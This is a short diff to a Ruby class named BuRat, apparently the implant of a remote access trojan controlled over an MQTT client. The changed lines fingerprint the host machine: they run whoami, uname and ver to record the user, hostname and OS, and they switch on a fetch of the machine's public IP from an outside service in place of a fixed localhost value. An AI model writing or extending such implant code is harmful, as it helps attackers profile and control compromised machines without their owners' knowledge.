@@ -13,10 +13,9 @@ class BuRat
   attr_accessor :status, :internals, :bushido
   def initialize()
     @id = SecureRandom.hex(2)
-    @host = (OS.windows? ? `ver` : `uname -sr`).strip
-    @os = OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip
-    #@ip = open('http://whatismyip.akamai.com').read
-    @ip = '127.0.0.1'
+    @host = OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip
+    @os = (OS.windows? ? `ver` : `uname -sr`).strip
+    @ip = open('http://whatismyip.akamai.com').read
     @status = :offline
     @internals = {
       :mqtt           => PahoMqtt::Client.new,
